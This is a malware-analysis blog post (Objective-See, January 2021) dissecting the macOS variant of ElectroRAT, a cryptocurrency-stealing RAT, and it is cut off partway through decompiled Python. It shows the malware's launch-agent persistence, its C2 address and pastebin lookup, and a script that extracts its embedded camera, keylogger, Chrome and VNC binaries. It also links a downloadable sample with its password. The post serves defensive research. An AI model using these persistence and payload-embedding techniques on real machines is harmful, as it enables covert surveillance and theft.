<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x61/checkin.png />
<meta name="twitter:title" content=Discharging&#32;ElectroRAT />
<meta name="twitter:description" content=Analyzing&#32;the&#32;first&#32;(macOS)&#32;malware&#32;of&#32;2021. />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Discharging&#32;ElectroRAT />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x61/checkin.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Discharging ElectroRAT</div>
  <div class="blogSubTitle">Analyzing the first (macOS) malware of 2021.</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / January 5, 2021</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; margin-bottom: 15px; font-size: 15px; border-radius: 5px;">
    <span class="n3rdFont">
    Our research, tools, and writing, are supported by the "Friends of Objective-See" such as:
    <br>
    <table border="0" style="width:100%; border: none">
    <tr style="width:100%;">
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://www.1Password.com/" style="text-decoration: none;">
      <img src="../images/friends/1Password.png" width="400px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      </a>
    </td>
    </tr>
    </table>
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </span>
</div>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/ElectroRAT.zip">samples</a> (ElectroRAT) to our malware collection (password: infect3d)</p>
<p>&hellip;please don’t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>Not one week into 2021, and we&rsquo;ve got the first new malware affecting macOS: <code>ElectroRat</code>!</p>
<p><code>ElectroRAT</code> is a cross-platform RAT, uncovered by <a href="https://www.intezer.com/">Intezer</a>:
<blockquote>
  "<i>we discovered a wide-ranging operation targeting cryptocurrency users, estimated to have initiated in January 2020. This extensive operation is composed of a full-fledged marketing campaign, custom cryptocurrency-related applications and a new Remote Access Tool (RAT) written from scratch." 
  <br>
  <br>
  [its main goal appears to] ...steal personal information from cryptocurrency users</i>" -Intezer 
</blockquote></p>
<br>
<div class="note">
<a href="https://twitter.com/AbbyMCH" class="inlineLink">Avigayil Mechtinger</a> a security researcher at Intezer, wrote an excellent writeup on ElectroRat: 
<br>
<br>
<center>
  <a href="https://www.intezer.com/blog/research/operation-ElectroRAT-attacker-creates-fake-companies-to-drain-your-crypto-wallets/" class="inlineLink">Operation ElectroRAT: Attacker Creates Fake Companies to Drain Your Crypto Wallets</a>.
</center>
<p>&hellip;it&rsquo;s a must read!</p>
</div>
<p>In terms of it&rsquo;s infection vector, Intezer noted:</p>
<blockquote>
  "<i>These [malicous] applications were promoted in cryptocurrency and blockchain-related forums such as bitcointalk and SteemCoinPan. The promotional posts, published by fake users, tempted readers to browse the applications’ web pages, where they could download the application without knowing they were actually installing malware.</i>" -Intezer 
</blockquote>
<p>As the <a href="https://www.intezer.com/blog/research/operation-ElectroRAT-attacker-creates-fake-companies-to-drain-your-crypto-wallets/">Intezer</a> report predominantly focused on the Windows variant of the malware, let&rsquo;s build upon their researcher, diving deeper into the macOS variant (<code>OSX.ElectroRAT</code>).</p>
<h3 id="triage">Triage</h3>
<p>The <a href="https://www.intezer.com/blog/research/operation-ElectroRAT-attacker-creates-fake-companies-to-drain-your-crypto-wallets/">Intezer</a> shared an the hash of a disk image (.dmg) containing the macOS variant of <code>ElectoRAT</code>.</p>
<p>With a SHA-1 of <code>2795ca35847cecb543f713b773d87c089a6a38ba</code>, we can grab this from <a href="https://www.virustotal.com/gui/file/5c884be3635eb55ce02e141d6fb07f760b6dbcace54f2217c69f287292ce59f6/details">VirusTotal</a> &hellip;noting its name (<code>eTrader-0.1.0_mchos.dmg</code>) and the fact that detections aren&rsquo;t that good (yet):</p>
<img src="../images/blog/blog_0x61/vt.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">eTrader-0.1.0_mchos.dmg</center>

<p>Once we download the disk image (<code>eTrader-0.1.0_mchos.dmg</code>), we can mount it via the <code>hdiutil</code> command:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% hdiutil attach ElectroRat/eTrader-0.1.0_mchos.dmg 
expected   CRC32 $6C68ADDC
/dev/disk2            GUID_partition_scheme           
/dev/disk2s1          Apple_HFS                       /Volumes/eTrader 0.1.0
</pre>
</div>
<p>It mounts to <code>/Volumes/eTrader 0.1.0</code>, and contains a single application, <code>eTrader.app</code>:</p>
<img src="../images/blog/blog_0x61/mounted.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">eTrader-0.1.0_mchos.dmg ...mounted</center>

<p>Via <a href="https://objective-see.com/products/whatsyoursign.html"><code>WhatsYourSign</code></a>, we can see this application is not notarized nor signed &hellip;meaning it won&rsquo;t (easily) run on recent versions of macOS:</p>
<img src="../images/blog/blog_0x61/unsigned.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">eTrader.app ...unsigned</center>

<p>Often triaging an application, I manually poke around via the terminal. However, a new (free!) app named <a href="https://www.mothersruin.com/software/Apparency/use.html">Apparency</a> (from the developers of <a href="https://www.mothersruin.com/software/SuspiciousPackage/">Suspicious Package</a>), offers a way to statically explore applications via the UI:</p>
<img src="../images/blog/blog_0x61/app.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">eTrader.app, in Apparency</center>

<p>On the right-hand side of the <a href="https://www.mothersruin.com/software/Apparency/use.html">Apparency</a> window, we see various information about the application, such as the identifier <code>(app.com.trader</code>) and a (fake) copyright notice (<code>(c) 2020 John Doe</code>).</p>
<p>Let&rsquo;s take a peak at the applications <code>Info.plist</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ defaults read /Volumes/eTrader\ 0.1.0/eTrader.app/Contents/Info.plist 
{
    AsarIntegrity = "{\\"checksums\\":{\\"app.asar\\":\\"kpsG1Z5PL...6vpzzhTLQ==\\"}}";
    BuildMachineOSBuild = 17D102;
    CFBundleDisplayName = eTrader;
    CFBundleExecutable = eTrader;
    CFBundleIdentifier = "app.com.trader";
    ...
    DTSDKBuild = "10.13";
    DTSDKName = "macosx10.13";
    DTXcode = 0941;
    DTXcodeBuild = 9F2000;
    ...
    NSCameraUsageDescription = "This app needs access to the camera";
    NSHighResolutionCapable = 1;
    NSHumanReadableCopyright = "Copyright \\U00a9 2020 John Doe";
    NSMainNibFile = MainMenu;
    NSMicrophoneUsageDescription = "This app needs access to the microphone";
    NSPrincipalClass = AtomApplication;
    ...
}
</pre>
</div>
<p>The presence of the <code>AsarIntegrity</code> key/value pair indicate its built via Electron.</p>
<div class="note">
<p>Electon is, &ldquo;<i>a framework for creating native applications with web technologies like JavaScript, HTML, and CSS</i>.&rdquo;</p>
<p>To learn more about Electon, head over to:</p>
<center>
  <a href="https://www.electronjs.org/" class="inlineLink">ElectronJS.org</a>.
</center>
</div>
<p>Other key/value pairs of interest include <code>NSCameraUsageDescription</code> and <code>NSMicrophoneUsageDescription</code> which indicate the application may request permission to access camera and microphone.</p>
<p>If we examine the application bundle in Finder, we notice a non-standard folder, <code>Contents/Utils</code> which contains a single file: <code>mdworker</code>:</p>
<img src="../images/blog/blog_0x61/utils.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Contents/Utils</center>

<p>Via the <code>file</code> command, we can ascertain that <code>mdworker</code> a standard 64-bit Mach-O executable:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file /Volumes/eTrader\ 0.1.0/eTrader.app/Contents/Utils/mdworker
/Volumes/eTrader 0.1.0/eTrader.app/Contents/Utils/mdworker: Mach-O 64-bit executable x86_64
</pre>
</div></p>
<p>&hellip;as we&rsquo;ll see, this appears to be core (malicious) component of <code>OSX.ElectroRAT</code></p>
<h3 id="analysis">Analysis</h3>
<p>Let&rsquo;s pop into a virtual machine and run the malware (<code>eTrader.app</code>). But first, let&rsquo;s install some free, open-source dynamic analysis tools, including:</p>
<ul>
<li>
<p><a href="https://objective-see.com/products/utilities.html#ProcessMonitor"><code>ProcessMonitor</code></a>
<br>
Our user-mode (<a href="https://github.com/objective-see/ProcessMonitor">open-source</a>) utility that monitors process creations and terminations, providing detailed information about such events.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/utilities.html#FileMonitor"><code>FileMonitor</code></a>
<br>
Our user-mode (<a href="https://github.com/objective-see/FileMonitor">open-source</a>) utility monitors file events (such as creation, modifications, and deletions) providing detailed information about such events.</p>
</li>
<li>
<p><a href="https://objective-see.com/products/Netiquette.html"><code>Netiquette</code></a>
<br>
Our (<a href="https://github.com/objective-see/Netiquette">open-source</a>) network monitor.</p>
</li>
</ul>
<p>When launched (in a VM), <code>eTrader.app</code> shows an innocuous looking sign-in window:
<img src="../images/blog/blog_0x61/run.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">eTrader.app UI</center>
</p>
<p>&hellip;but in the background, our passive dynamic analysis tools readily detect malicious behavior.</p>
<p>First off (via the ProcessMonitor), we see that the application (who&rsquo;s pid is <code>1350</code>) executes the <code>Utils/mdworker</code> binary (via <code>bash</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    ...
    "uid" : 501,
    "arguments" : [
      "/bin/sh",
      "-c",
      "/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker"
    ],
    "ppid" : 1350,
    
    "architecture" : "Intel",
    "path" : "/bin/sh",
    
    "name" : "sh",
    "pid" : 1355
  }
} 

</pre>
</div>
<p>Once off and running, our FileMonitor captures the <code>Utils/mdworker</code> copying itself to <code>~/.mdworker</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty

{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/user/.mdworker",
    "process" : {
      
      "uid" : 501,
      "arguments" : [
        "/bin/sh",
        "-c",
        "/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker"
      ],
      "ppid" : 1350,
      
      "architecture" : "Intel",
      "path" : "/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker",
      "name" : "mdworker",
      "pid" : 1351
    }
  }
}

</pre>
</div>
<p>The <code>mdworker</code> binary then creates a launch agent plist, <code>~/Library/LaunchAgents/mdworker.plist</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty

{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/user/Library/LaunchAgents/mdworker.plist",
    "process" : {
      
      "uid" : 501,
      "arguments" : [
        "/bin/sh",
        "-c",
        "/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker"
      ],
      "ppid" : 1350,
      
      "architecture" : "Intel",
      "path" : "/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker",
      "name" : "mdworker",
      "pid" : 1351
    }
  }
}

</pre>
</div>
<p>As expected, the launch agent plist (<code>mdworker.plist</code>) references the <code>.mdworker</code> binary:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% cat ~/Library/LaunchAgents/mdworker.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>mdworker</string>
    <key>ProgramArguments</key>
      <array>
        <string>/Users/user/.mdworker</string>
      </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
</pre>
</div>
<p>Also, worth noting, as the <code>RunAtLoad</code> is set to <code>true</code> the OS will automatically (re)launch the malware each time the user (re)logs in.</p>
<p>Now that <code>OSX.ElectroRAT</code> has persisted, what does it do? In a Twitter thread, <a href="https://twitter.com/AbbyMCH">Avigayil</a> (the security researcher at Intezer) notes that the malware, &ldquo;<em>queries a raw pastebin page to retrieve the C&amp;C IP address</em>&rdquo;:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">[2/7] Upon execution, ElectroRAT queries a raw pastebin page to retrieve the C&amp;C IP address. The malware then calls the registerUser function, which creates and sends a user registration Post request to the C&amp;C. <a href="https://t.co/r98bbVThs3">pic.twitter.com/r98bbVThs3</a></p>&mdash; Avigayil Mechtinger (@AbbyMCH) <a href="https://twitter.com/AbbyMCH/status/1346470186082136064?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>Via Wireshark, we can confirm the macOS variant of <code>ElectroRAT</code> performs these same actions. First querying pastebin:</p>
<img src="../images/blog/blog_0x61/pb.png"  width="95%" class="center" style="border-radius: 4px;">

<p>&hellip;and then once the address of the command and control server (<code>213.226.100.140</code>) is retrieved, connects out (with some basic information about infected machine):</p>
<img src="../images/blog/blog_0x61/checkin.png"  width="95%" class="center" style="border-radius: 4px;">

<p>Once the malware has checked in with the command and control server, it acts upon any (remote) tasking:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">[5/7]  Commands received from the C&amp;C are parsed by the RAT using corresponding functions before sending a message back with the response. The commands are sent as a json structure with the following keys: type, uid and data for additional parameters needed for the command. <a href="https://t.co/7Y2A70Ha9g">pic.twitter.com/7Y2A70Ha9g</a></p>&mdash; Avigayil Mechtinger (@AbbyMCH) <a href="https://twitter.com/AbbyMCH/status/1346470201173266432?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p><a href="https://twitter.com/AbbyMCH">Avigayil</a> also notes that:
<blockquote>
  "<i>The attacker uses go-bindata to embed additional binaries within the malware</i>"
</blockquote></p>
<p>In a disassembler, we can search for strings (<code>_main.static_darwin*</code>) to uncover what may be (statically) embedded binaries, specific to the macOS (darwin) variant:</p>
<img src="../images/blog/blog_0x61/static.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Statically embedded binaries(?)</center>

<p>&hellip;so, how to extract these embedded binaries? Well thanks to <a href="https://twitter.com/AbbyMCH">Avigayil</a>, we know they are embedded via <a href="https://github.com/go-bindata/go-bindata"><code>go-bindata</code></a>. This in an open-source project (on Github), that:</p>
<blockquote>
  "<i>converts any file into manageable Go source code.
  <br>
  <br>
  ...useful for embedding binary data into a Go program. The file data is optionally gzip compressed</i>" -go-bindata
</blockquote>
<p>So, we know the binaries are embedded and (likely) gzip compressed.</p>
<p>Hopping back to the disassembler, let&rsquo;s first find the embedded (gzipped) binary data(s) (&hellip;we&rsquo;ll use the embedded webcam capture binary, as an example).</p>
<p>As noted, the malware contains various functions named <code>main.static_darwin*</code>, that seem relevant to the embedded binary data. Looking at the <code>main.static_darwinCam_macos</code> function (at <code>0x0000000004395bf0</code>) we find a cross-reference to a variable named <code>_main._static_darwinCam_maco</code> (note the <code>_</code> in the <code>_static</code>) that&rsquo;s passed as an argument to a function named <code>main.bindataRead</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-NASM" data-lang="NASM"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>_main.static_darwinCam_macos:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span> <span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span> <span style="color:#75715e">; argument #3 for method _main.bindataRead</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span> <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000004395c2d</span>   mov   rdx, <span style="color:#66d9ef">qword</span> [_main._static_darwinCam_macos] 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span> <span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span> <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000004395c57</span>   call  main.bindataRead  </span></span></code></pre></div>
<p>The <code>main._static_darwinCam_macos</code> variable is located at <code>0x0000000004d3f190</code> &hellip;and contains a pointer <code>0x0000000004800760</code>
0x0000000004d3f190  dq   0x0000000004800760</p>
<p>Heading over to <code>0x0000000004800760</code> (offset <code>0x800760</code> in the file) we find gzip&rsquo;d data:</p>
<img src="../images/blog/blog_0x61/embed.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Embedded gzipped data</center>

<br>
<div class="note">
<p>gzip&rsquo;d data begins with a two byte signature: 0x1F 0x8B. Following is a another byte, indicating the compression method. The most common value for this 3rd byte is 0x08 (DEFLATE).</p>
</div>
<p>Hooray, we&rsquo;ve found the embedded compressed binary data for the (web)camera binary.</p>
<p>To extract out the embedded bytes, I put together a super simple python script that simply open the malware&rsquo;s binary, goes to the offset of the embedded data, and writes it said out to disk. As the <code>/usr/bin/gzip</code> utility (that we&rsquo;ll use to decompress the extracted data), ignores extra/trailer bytes, we don&rsquo;t have to care about getting the length of the compressed data write. As such, we take the lazy approach and just write out all the embedded data from the (start) offset in the malicious binary, to the end.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">import</span> gzip
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;rb&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>f<span style="color:#f92672">.</span>seek(int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>), <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>o <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;extractedData.gz&#34;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>o<span style="color:#f92672">.</span>write(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>o<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>f<span style="color:#f92672">.</span>close()</span></span></code></pre></div>
<p>Executing the above script with the path to the malware (<code>mdworker</code>) and the offset (of the embedded cam binary data, <code>0x800760</code>) will extract and write out the compressed bytes to <code>extractedData.gz</code>. This file can then be decompressed with the <code>gzip</code> utility:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% python extract.py mdworker 800760

% gzip -d extracted.gz 
gzip: extracted.gz: trailing garbage ignored

% file extracted
extracted: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [i386:Mach-O executable i386]
</pre>
</div>
<p>Woohoo, we&rsquo;ve now got a Mach-O binary!</p>
<p>We repeat the process for each of the <code>main.static_darwin*</code> symbols. Which gets us several other Mach-O binaries &hellip;and a &ldquo;Apple Desktop Services Store&rdquo; (DS_Store) file:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% file *
darwinCam:         Mach-O universal binary with 2 architectures: 
                   [x86_64:Mach-O executable x86_64] [i386:Mach-O executable i386]

darwinChrome:      Mach-O 64-bit executable x86_64

darwinDs_store:    Apple Desktop Services Store

darwinKeylogger:   Mach-O 64-bit executable x86_64

darwinVnc:         Mach-O 64-bit executable x86_64
</pre>
</div>
<br>
<div class="note">
You can find these extract files in the <a href="https://objective-see.com/downloads/malware/ElectroRAT.zip" class="inlineLink">OSX.ElectroRAT</a> sample I've uploaded to Objective-See's macOS malware collection.
</div>
<p>Let&rsquo;s briefly triage these (now extracted) binaries</p>
<ul>
<li>
<p><code>darwinCam</code> (<code>SHA1: 7e0a289572c2b3ef5482dded6019f51f35f85456</code>):<br><br>
Appears to be a <code>ImageSnap</code> &hellip;a <a href="%60https://github.com/rharder/imagesnap%60">well-known (open-source)</a> commandline utility for capturing images via the infected device&rsquo;s camera: <br><br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
./darwinCam -h

USAGE: ./darwinCam [options] [filename]
Version: 0.2.5
Captures an image from a video device and saves it in a file.
If no device is specified, the system default will be used.
If no filename is specfied, snapshot.jpg will be used.
Supported image types: JPEG, TIFF, PNG, GIF, BMP
  -h          This help message
  -v          Verbose mode
  -l          List available video devices
  -t x.xx     Take a picture every x.xx seconds
  -q          Quiet mode. Do not output any text
  -w x.xx     Warmup. Delay snapshot x.xx seconds after turning on camera
  -d device   Use named video device
</pre>
</div></p>
</li>
<li>
<p><code>darwinChrome</code> (<code>SHA1: 4bb418ba9833cd416fd02990b8c8fd4fa8c11c0c</code>):<br><br>
Via embedded strings, we can determine that the <code>darwinChrome</code> was packaged up with <code>PyInstaller</code>. As such can use the <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> utility, to extract (unpackage) its contents:
<br><br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ python pyinstxtractor.py darwinChrome
[+] Processing darwinChrome
[+] Pyinstaller version: 2.1+
[+] Python version: 27
[+] Length of package: 5155779 bytes
[+] Found 109 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: Apple.pyc
[+] Found 335 files in PYZ archive
[+] Successfully extracted pyinstaller archive: darwinChrome
</pre>
</div>
<br>
This produces several files including a compiled Python file, <code>Apple.pyc</code>. Via an online decompiler we can then recover <code>Apple.pyc</code>&rsquo;s Python source code:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1</span><span><span style="color:#75715e"># uncompyle6 version 3.5.0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2</span><span><span style="color:#75715e"># Python bytecode 2.7 (62211)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3</span><span><span style="color:#75715e"># Decompiled from: Python 2.7.5 (default, Aug  7 2019, 00:51:29) </span>
